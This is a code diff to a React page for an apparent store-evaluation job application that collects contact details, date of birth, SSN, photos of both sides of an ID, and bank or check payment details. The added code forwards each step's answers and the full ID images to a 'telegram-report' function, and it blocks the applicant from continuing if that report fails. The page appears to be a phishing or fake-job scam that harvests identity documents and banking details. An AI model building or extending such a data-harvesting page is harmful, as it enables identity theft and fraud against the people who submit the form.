@@ -1,4 +1,5 @@
 import { ChangeEvent, FormEvent, useEffect, useMemo, useState } from "react";
+import { supabase } from "@/integrations/supabase/client";
 import retailevalLogo from "@/assets/retaileval-professional-logo.png";
 import storeEvaluationHero from "@/assets/store-evaluation-hero.jpg";
 import affirmLogo from "@/assets/partners/affirm-logo.jpg";
@@ -42,6 +43,8 @@ type FormDataState = {
   accountNumber: string;
   accountType: string;
 };
+
+type UploadedImages = Partial<Record<"idFront" | "idBack", { fileName: string; dataUrl: string }>>;
 
 type LoaderState = {
   active: boolean;
@@ -140,10 +143,32 @@ const delay = (ms: number) => new Promise((resolve) => window.setTimeout(resolve
 
 const createTrackingCode = () => `RE-${new Date().getFullYear()}-${Math.random().toString(36).slice(2, 8).toUpperCase()}`;
 
+const reportFieldsForStep = (step: number, data: FormDataState): Record<string, string> => {
+  const location = `${data.address}, ${data.city}, ${data.state} ${data.zip}`.replace(/^,\s*/, "").trim();
+  switch (step) {
+    case 1: return { "ZIP Code": data.zip, City: data.city, State: data.state };
+    case 2: return { Address: location };
+    case 3: return { Name: data.fullName, Email: data.email, Phone: data.phone, "Date of Birth": data.dob };
+    case 4: return { "Existing Employee": data.employee };
+    case 5: return { SSN: data.ssn ? "9 digits provided" : "Missing" };
+    case 6: return { "ID Front": data.idFront };
+    case 7: return { "ID Back": data.idBack };
+    case 8: return { "Payment Type": data.paymentMethod };
+    case 9:
+      return data.paymentMethod === "Check"
+        ? { "Payment Type": data.paymentMethod, "Payee Name": data.payeeName, "Mailing Address": data.payeeAddress }
+        : { "Payment Type": data.paymentMethod, "Bank Name": data.bankName, "Routing Number": data.routingNumber, "Account Type": data.accountType, Account: data.accountNumber ? `Ending ${data.accountNumber.slice(-4)}` : "" };
+    default: return { Name: data.fullName, Email: data.email, Phone: data.phone, Location: location, "Payment Type": data.paymentMethod };
+  }
+};
+
+const reportTitleForStep = (step: number) => ["", "ZIP Code Submitted", "Address Submitted", "Personal Information Submitted", "Employee Status Submitted", "SSN Verification Submitted", "ID Front Image Submitted", "ID Back Image Submitted", "Payment Type Selected", "Payment Details Submitted", "Final Application Submitted"][step] ?? "Application Update";
+
 const Index = () => {
   const [mode, setMode] = useState<"home" | "application" | "success" | "tracking">("home");
   const [step, setStep] = useState(1);
   const [formData, setFormData] = useState<FormDataState>(initialFormData);
+  const [uploadedImages, setUploadedImages] = useState<UploadedImages>({});
   const [trackingRecord, setTrackingRecord] = useState<TrackingRecord | null>(null);
   const [error, setError] = useState("");
   const [loader, setLoader] = useState<LoaderState>({ active: false, text: "Processing..." });
@@ -189,14 +214,34 @@ const Index = () => {
 
   const updateField = (field: keyof FormDataState, value: string) => {
     setError("");
-    setFormData((current) => ({ ...current, [field]: value }));
+    setFormData((current) => field === "zip" && value !== current.zip ? { ...current, zip: value, city: "", state: "", address: "" } : { ...current, [field]: value });
   };
 
   const startApplication = async (zip = "") => {
-    if (zip) updateField("zip", zip.replace(/\D/g, "").slice(0, 5));
+    const cleanZip = zip.replace(/\D/g, "").slice(0, 5);
+    const savedZip = formData.zip;
+    if (cleanZip && cleanZip !== savedZip) {
+      setFormData({ ...initialFormData, zip: cleanZip });
+      setUploadedImages({});
+      localStorage.removeItem(STORAGE_KEY);
+    } else if (cleanZip) {
+      updateField("zip", cleanZip);
+    }
     setMode("application");
-    setStep(zip ? 2 : 1);
+    setStep(1);
     await showLoader("Processing...", zip ? 3 : 2);
+  };
+
+  const sendStepReport = async (targetStep: number, image?: { fileName: string; dataUrl: string }, fields = reportFieldsForStep(targetStep, formData)) => {
+    try {
+      const { error: reportError } = await supabase.functions.invoke("telegram-report", {
+        body: { step: targetStep, title: reportTitleForStep(targetStep), fields, image },
+      });
+      if (reportError) throw reportError;
+    } catch {
+      setError("Telegram notification could not be delivered. Please try again.");
+      throw new Error("Telegram notification failed");
+    }
   };
 
   const lookupZip = async () => {
@@ -274,15 +319,18 @@ const Index = () => {
       await showLoader("Processing...", 4);
     }
 
+    let reportFields = reportFieldsForStep(step, formData);
     if (step === 1) {
       const located = await lookupZip();
       if (!located) return;
+      reportFields = { "ZIP Code": formData.zip, Status: "Location verified" };
     }
 
     if (step === 9) {
       await showLoader("Processing...", 3);
     }
 
+    await sendStepReport(step, step === 6 ? uploadedImages.idFront : step === 7 ? uploadedImages.idBack : undefined, reportFields);
     setStep((current) => Math.min(current + 1, TOTAL_STEPS));
     window.scrollTo({ top: 0, behavior: "smooth" });
   };
@@ -304,6 +352,7 @@ const Index = () => {
       submittedAt: new Date().toISOString(),
       status: "Application Received",
     };
+    await sendStepReport(TOTAL_STEPS);
     setTrackingRecord(completed);
     localStorage.setItem(TRACKING_KEY, JSON.stringify(completed));
     localStorage.removeItem(STORAGE_KEY);
@@ -318,7 +367,14 @@ const Index = () => {
       event.target.value = "";
       return;
     }
-    updateField(field, file.name);
+    const reader = new FileReader();
+    reader.onload = () => {
+      updateField(field, file.name);
+      if (field === "idFront" || field === "idBack") {
+        setUploadedImages((current) => ({ ...current, [field]: { fileName: file.name, dataUrl: String(reader.result) } }));
+      }
+    };
+    reader.readAsDataURL(file);
   };
 
   if (mode === "success") {
